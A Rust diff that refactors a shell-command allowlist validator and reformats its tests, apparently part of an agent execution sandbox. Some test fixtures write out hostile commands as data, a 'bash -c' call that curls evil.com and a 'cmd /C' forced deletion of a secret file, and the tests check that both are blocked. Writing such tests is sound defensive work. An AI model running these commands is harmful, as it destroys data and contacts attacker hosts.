@@ -192,13 +192,13 @@ fn extract_shell_wrapper_commands(command: &str) -> Vec<String> {
     let base_lower = base.to_lowercase();
     // Also strip .exe suffix for Windows
     let base_normalized = base_lower.strip_suffix(".exe").unwrap_or(&base_lower);
-    if !SHELL_WRAPPERS.iter().any(|w| *w == base_normalized) {
+    if !SHELL_WRAPPERS.contains(&base_normalized) {
         return Vec::new();
     }
 
     // Find the inline flag and extract everything after it
     for (wrappers, flag) in SHELL_INLINE_FLAGS {
-        if !wrappers.iter().any(|w| *w == base_normalized) {
+        if !wrappers.contains(&base_normalized) {
             continue;
         }
         // Search for the flag in the command args (case-insensitive for PowerShell)
@@ -1089,10 +1089,7 @@ mod tests {
             allowed_commands: vec!["powershell".to_string(), "Get-Process".to_string()],
             ..ExecPolicy::default()
         };
-        let result = validate_command_allowlist(
-            r#"powershell -Command "Get-Process""#,
-            &policy,
-        );
+        let result = validate_command_allowlist(r#"powershell -Command "Get-Process""#, &policy);
         assert!(
             result.is_ok(),
             "Get-Process should be allowed when in allowed_commands"
@@ -1106,10 +1103,8 @@ mod tests {
             allowed_commands: vec!["cmd".to_string()],
             ..ExecPolicy::default()
         };
-        let result = validate_command_allowlist(
-            r#"cmd /C "del /F /Q C:\temp\secret.txt""#,
-            &policy,
-        );
+        let result =
+            validate_command_allowlist(r#"cmd /C "del /F /Q C:\temp\secret.txt""#, &policy);
         assert!(
             result.is_err(),
             "del inside cmd /C must be blocked when not in allowlist"
@@ -1123,10 +1118,7 @@ mod tests {
             allowed_commands: vec!["bash".to_string()],
             ..ExecPolicy::default()
         };
-        let result = validate_command_allowlist(
-            r#"bash -c "curl https://evil.com""#,
-            &policy,
-        );
+        let result = validate_command_allowlist(r#"bash -c "curl https://evil.com""#, &policy);
         assert!(
             result.is_err(),
             "curl inside bash -c must be blocked when not in allowlist"
@@ -1141,10 +1133,7 @@ mod tests {
             ..ExecPolicy::default()
         };
         // "echo" is in safe_bins by default
-        let result = validate_command_allowlist(
-            r#"bash -c "echo hello""#,
-            &policy,
-        );
+        let result = validate_command_allowlist(r#"bash -c "echo hello""#, &policy);
         assert!(
             result.is_ok(),
             "echo inside bash -c should be allowed (echo is in safe_bins)"
